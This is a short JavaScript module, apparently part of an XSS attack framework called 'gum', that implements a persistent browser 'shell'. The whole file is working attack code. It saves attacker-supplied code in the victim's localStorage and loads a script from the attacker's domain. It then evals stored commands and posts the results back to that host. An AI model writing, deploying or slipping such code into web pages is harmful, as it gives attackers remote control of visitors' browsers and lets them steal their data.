/*
	xss shell - gum.js

gum_xsshell = {
    'type':'dom',
	'shell':'http://' + gum.domain + '/shell'
};

*/

dom_shell_type = {
	'dom':"gum_shell_url=window.localStorage.getItem('gum_shell_url');gum.script(gum_shell_url);setTimeout(function(){gum.xform(gum_shell_url,{'info':eval(window.localStorage.getItem('gum_shell_code'))})}, 3000);",
};

if(!gum_xsshell['shell']){gum_xsshell['shell'] = 'http://' + gum.domain + '/shell'};
window.localStorage.setItem('gum_shell_code', dom_shell_type[gum_xsshell['type']]);
window.localStorage.setItem('gum_shell_url', gum_xsshell['shell']);
eval(window.localStorage.getItem('gum_shell_code'));
